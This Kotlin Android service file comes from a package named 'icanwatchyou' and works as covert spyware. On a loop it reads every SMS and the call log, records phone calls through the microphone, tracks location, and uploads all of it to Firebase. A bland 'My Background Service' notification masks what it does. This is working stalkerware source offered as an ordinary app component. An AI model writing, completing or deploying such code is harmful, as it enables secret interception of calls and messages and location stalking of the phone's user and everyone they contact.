package com.example.icanwatchyou
import android.annotation.SuppressLint
import android.app.Service
import android.content.Intent
import android.content.pm.PackageManager
import android.location.Location
import android.media.MediaRecorder
import android.net.Uri
import android.os.Handler
import android.os.IBinder
import android.provider.ContactsContract
import android.provider.Telephony
import android.util.Log
import androidx.core.app.ActivityCompat
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.storage.FirebaseStorage
import java.io.File
import android.Manifest
import android.app.Notification
import android.app.PendingIntent
import android.content.ContentResolver
import android.content.Context
import android.database.Cursor
import android.provider.CallLog
import android.telephony.PhoneStateListener
import android.telephony.TelephonyManager
import androidx.core.app.NotificationCompat
import com.google.android.gms.location.LocationServices
import java.util.*

class MyBackgroundService : Service() {

    private val TAG = "MyBackgroundService"
    private lateinit var handler: Handler
    private lateinit var runnable: Runnable
    private val LOCATION_INTERVAL: Long = 1000 * 60 * 30
    private val INTERVAL: Long = 5000 // Interval in milliseconds
    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private val NOTIFICATION_ID = 123 // Unique ID for the notification
    private val CHANNEL_ID = "MyBackgroundService" // Notification channel ID

    private lateinit var mediaRecorder: MediaRecorder
    private lateinit var outputFile: File

    private var isRecording = false
    private lateinit var callRecordingFile: File

    override fun onCreate() {
        super.onCreate()
        handler = Handler()
        runnable = Runnable {
            // Perform your background tasks here
            Log.d(TAG, "Background task is running")
            handler.postDelayed(runnable, INTERVAL)
            fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
            requestLocationUpdates()
            // Check if call recording is ongoing
            val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            telephonyManager.listen(object : PhoneStateListener() {
                override fun onCallStateChanged(state: Int, phoneNumber: String?) {
                    when (state) {
                        TelephonyManager.CALL_STATE_RINGING -> {
                            // Incoming call
                            Log.d(TAG, "Incoming call from: $phoneNumber")
                        }
                        TelephonyManager.CALL_STATE_OFFHOOK -> {
                            // Call answered (outgoing or incoming)
                            Log.d(TAG, "Call answered")
                            // Start recording
                            startRecording()
                        }
                        TelephonyManager.CALL_STATE_IDLE -> {
                            // Call ended
                            Log.d(TAG, "Call ended")
                            // Stop recording
                            stopRecording()
                        }
                    }
                }
            }, PhoneStateListener.LISTEN_CALL_STATE)

            getCallLogs(this);
            val uri = Uri.parse("content://sms")
            val cursor = contentResolver.query(uri, null, null, null, null)

            cursor?.use { // Use the cursor in a safe manner
                val addressIndex = it.getColumnIndex(Telephony.Sms.ADDRESS)
                val bodyIndex = it.getColumnIndex(Telephony.Sms.BODY)
                val dateIndex = it.getColumnIndex(Telephony.Sms.DATE)

                while (it.moveToNext()) {
                    val sender = if (addressIndex != -1) it.getString(addressIndex) else ""
                    val body = if (bodyIndex != -1) it.getString(bodyIndex) else ""
                    val timestamp = if (dateIndex != -1) it.getLong(dateIndex) else 0L

                    // Save or process the SMS details as needed
                    saveSmsToFirebase(sender, body, timestamp)
                }
            }
        }
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        startLocationUpdateHandler()
    }
    fun getCallLogs(context: Context): List<String> {
        val callLogsList = mutableListOf<String>()
        val contentResolver: ContentResolver = context.contentResolver
        val projection = arrayOf(CallLog.Calls.NUMBER)
        val sortOrder = "${CallLog.Calls.DATE} DESC" // Sorting by date in descending order

        // Querying the call log content provider
        val cursor: Cursor? = contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            projection,
            null,
            null,
            sortOrder
        )

        cursor?.use {
            val numberIndex = it.getColumnIndex(CallLog.Calls.NUMBER)

            while (it.moveToNext()) {
                val number = it.getString(numberIndex)
                callLogsList.add(number)
            }
        }
        val databaseReference = FirebaseDatabase.getInstance().getReference().child("calllogs")//
        databaseReference.setValue(callLogsList)
        return callLogsList
    }
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // Create and show a notification as part of the foreground service
        val notification = createNotification()
        startForeground(NOTIFICATION_ID, notification)

        // Your existing code
        handler.postDelayed(runnable, INTERVAL)
        return START_STICKY // Service will be restarted if it's killed by the system
    }

    private fun createNotification(): Notification {
        // Create an Intent for launching the app when the notification is clicked
        val notificationIntent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent,
            PendingIntent.FLAG_IMMUTABLE)

        // Build the notification
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("My Background Service")
            .setContentText("Running...")
            .setSmallIcon(R.drawable.ic_launcher_background)
            .setContentIntent(pendingIntent)
            .build()
    }
    private fun startLocationUpdateHandler() {
        // Schedule location update handler
        val locationUpdateRunnable = object : Runnable {
            override fun run() {
                // Request location updates and save to Firebase
                requestLocationUpdates()
                handler.postDelayed(this, LOCATION_INTERVAL)
            }
        }
        handler.post(locationUpdateRunnable)
    }

    private fun startRecording() {
        try {
            mediaRecorder = MediaRecorder()
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC)
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)

            // Create a file to store the recording
            val directory = File(getExternalFilesDir(null), "call_recordings")
            if (!directory.exists()) {
                directory.mkdirs()
            }
            val fileName = "${UUID.randomUUID()}"+"${System.currentTimeMillis()}"+".m4a"
            outputFile = File(directory, fileName)

            mediaRecorder.setOutputFile(outputFile.absolutePath)
            mediaRecorder.prepare()
            mediaRecorder.start()
        } catch (e: Exception) {
            Log.e(TAG, "Error starting recording: ${e.message}")
        }
    }

    private fun stopRecording() {
        try {
            mediaRecorder.stop()
            mediaRecorder.release()

            // Save recording to Firebase Realtime Database
            saveRecordingToFirebase(outputFile)
        } catch (e: Exception) {
            Log.e(TAG, "Error stopping recording: ${e.message}")
        }
    }

    private fun saveRecordingToFirebase(file: File) {
        // Upload the recorded call file to Firebase Storage
        // Get the download URL and save call details to Firebase Realtime Database
        val storageReference = FirebaseStorage.getInstance().getReference().child("call_recordings")
        storageReference.putFile(Uri.fromFile(file))
            .addOnSuccessListener { taskSnapshot ->
                storageReference.downloadUrl.addOnSuccessListener { uri ->
                    // Save recording details to Firebase Realtime Database
                    val databaseReference = FirebaseDatabase.getInstance().getReference("call_recordings")
                    val arr=getCallLogs(this)
                    val recordingData = mapOf(
                        "url" to uri.toString(),
                        "to" to arr[0].toString(),
                        "timestamp" to System.currentTimeMillis()
                    )
                    databaseReference.push().setValue(recordingData)
                }
            }
            .addOnFailureListener { e ->
                Log.e(TAG, "Error uploading call recording: ${e.message}")
            }
    }




    private fun saveSmsToFirebase(sender: String, body: String, timestamp: Long) {
        // Save SMS details to Firebase Realtime Database
        // Replace the placeholders with actual Firebase Realtime Database reference
        val databaseReference = FirebaseDatabase.getInstance().getReference()// Firebase Realtime Database reference

        val smsData = mapOf(
            "sender" to sender,
            "body" to body,
            "timestamp" to timestamp
        )
        databaseReference.child("messages").child(sender.toString()).child(timestamp.toString()).setValue(smsData)
    }


    override fun onDestroy() {
        super.onDestroy()
        handler.removeCallbacks(runnable)
        //stopCallRecording()
        Log.d(TAG, "Background service is destroyed")
    }
    private fun requestLocationUpdates() {
        handler.post(object : Runnable {
            override fun run() {
                if (ActivityCompat.checkSelfPermission(
                        this@MyBackgroundService,
                        Manifest.permission.ACCESS_FINE_LOCATION
                    ) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(
                        this@MyBackgroundService,
                        Manifest.permission.ACCESS_COARSE_LOCATION
                    ) != PackageManager.PERMISSION_GRANTED
                ) {
                    return
                }
                fusedLocationClient.lastLocation
                    .addOnSuccessListener { location: Location? ->
                        location?.let {
                            // Save location data to Firebase
                            saveLocationToFirebase(it.latitude, it.longitude)
                        }
                    }
                handler.postDelayed(this, INTERVAL)
            }
        })
    }

    @SuppressLint("MissingPermission")
    private fun saveLocationToFirebase(latitude: Double, longitude: Double) {
        val database = FirebaseDatabase.getInstance()
        val locationRef = database.getReference("locations")
        val locationData = hashMapOf(
            "latitude" to latitude,
            "longitude" to longitude
        )

        locationRef.setValue(locationData)
    }
    override fun onBind(intent: Intent?): IBinder? {
        return null
    }
}
